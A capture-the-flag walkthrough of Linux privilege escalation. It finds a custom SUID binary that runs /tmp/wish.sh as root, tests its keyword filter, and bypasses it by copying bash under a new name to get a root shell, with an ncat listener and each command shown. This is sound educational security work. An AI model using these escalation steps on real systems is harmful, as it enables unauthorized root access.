
> Platform Name: CTF Challenge
> Category: #PrivilegeEscalation, #Linux
> Date: 2025-10-15
> Author: Joe Lipinski

---
## Table of Contents

1. [Introduction](#introduction)
2. [Setup](#setup)
3. [Reconnaissance](#reconnaissance)
4. [Enumeration](#enumeration)
5. [Exploitation](#exploitation)
6. [Post-Exploitation/Flag](#post-exploitationflag)
7. [Lessons Learned](#lessons-learned)
8. [References](#references)

---
## Introduction

Objective:
The primary objective of this challenge was to gain root access on a Linux target and capture the final flag located in the /root directory. The path to root involved escalating privileges from a low-privilege web user (www-data).

Description:
This challenge centered around a custom SUID binary. Initial access as www-data was assumed, and the focus was entirely on local enumeration and privilege escalation. The core of the challenge was to analyze the binary, discover its flawed security mechanism, and bypass it to execute commands as the root user.

---
## Setup
- **Operating System:** macOS
- **Tools Used:** #ncat, #python, #find
- **Network Configuration:** A reverse shell was established from the target to the attacker's machine, which was listening on a designated port.

Bash

```
# Example: Starting the reverse shell listener
ncat -nlvp 9001
```

---
## Reconnaissance
Initial reconnaissance and port scanning steps (e.g., Nmap) were not part of this walkthrough, as the starting point was having already obtained a low-privilege shell on the target system.

---
## Enumeration
Enumeration began after establishing a stable reverse shell as the `www-data` user. The goal was to find a vector for privilege escalation.

The following manual checks were performed:

1. **Check `sudo` permissions**: This was the first check, but the `sudo` command was not found on the system.

``` bash
sudo -l
# Output: bash: sudo: command not found
```

2. **Check for SUID binaries**: This was the key enumeration step. A search was performed for all files with the SUID bit set.

``` bash
find / -type f -perm -4000 2>/dev/null
```

**Interesting Discoveries:**
- **Discovery**: The `find` command revealed an unusual, non-standard SUID binary: `/usr/local/bin/admin_help`. This immediately became the primary target for investigation.

---
## Exploitation
Initial exploitation to gain the `www-data` shell was assumed to be complete. The primary exploitation detailed here is the exploitation of the privilege escalation vulnerability.

---
## Privilege Escalation

### Vulnerability Identification
The vulnerability was a custom SUID binary `/usr/local/bin/admin_help` owned by root. Analysis with the `strings`command revealed that this binary was designed to execute a script located at `/tmp/wish.sh`. However, it contained a flawed security filter that checked the contents of the script for "bad strings" before execution.

### Steps to Escalate Privileges:

1. **Analyze the binary**: After identifying the SUID binary, the `strings` command was used to understand its functionality.

``` bash
strings /usr/local/bin/admin_help
```

This revealed the program's intent to execute `/tmp/wish.sh`.

2. **Initial Exploit Attempt**: A simple payload was created in `/tmp/wish.sh`.

``` bash
echo "/bin/bash" > /tmp/wish.sh
/usr/local/bin/admin_help
```

This failed with a "Bad String in File" error, indicating a filter was in place.

3. **Test Filter Hypothesis**: A new hypothesis was formed: the program filters for "bad words" like `bash` or `sh`. A test was conducted using a "safe" command.

``` bash
echo 'id > /tmp/pwned' > /tmp/wish.sh
/usr/local/bin/admin_help
cat /tmp/pwned
```

The output file `/tmp/pwned` contained `uid=0(root)`, confirming the filter hypothesis and proving we could execute commands as root.

4. **Bypass the Filter**: The filter was bypassed by copying the `/bin/bash` executable to a new, "safe" name.

``` bash
cp /bin/bash /tmp/mything
```

5. **Final Payload**: The `wish.sh` script was created one last time, pointing to our renamed shell.

``` bash
echo '/tmp/mything' > /tmp/wish.sh
```

6. **Trigger Exploit**: The SUID binary was run, which now executed our payload without being caught by the filter, granting a root shell.

 ``` bash
./admin_help
# whoami
root
```

---

## Post-Exploitation/Flag

### Capturing the Flag
Once root access was obtained, the flag was found in the `/root` directory.

``` bash
# Reading the flag
cd /root
cat flag.txt
```

> [!success] Flag
> 
> flag{93541544b91b7d2b9d61e90becbca309}

---
## Lessons Learned
- **Methodical Enumeration is Key**: The path to root was discovered by systematically checking common privilege escalation vectors, starting with `sudo` and moving to SUID files.
- **Analyze Custom Binaries**: Non-standard binaries, especially with SUID permissions, are prime targets. Using tools like `strings` is essential for static analysis.
- **Bypassing Filters**: When faced with a security mechanism, form a hypothesis (e.g., a word filter) and test it with a safe payload. Simple bypasses, like renaming an executable, can be very effective.
- **CTF Binaries Have Bugs**: Analysis of the source code revealed a bug where the filter only ever checked for "sh", not the other words in its list. This is a realistic detail in challenges.

---
## References
- The analysis of the binary's source code (`admin_help.c`) provided a complete understanding of the intended (and flawed) functionality.
- **GTFOBins**: A curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems. While not used for the final exploit, it's a critical resource for SUID binary analysis.
- **LinPEAS**: An automated script for comprehensive Linux privilege escalation enumeration.

---

**Disclaimer**: This write-up is for educational purposes only. Always obtain proper authorization before testing or exploiting any system.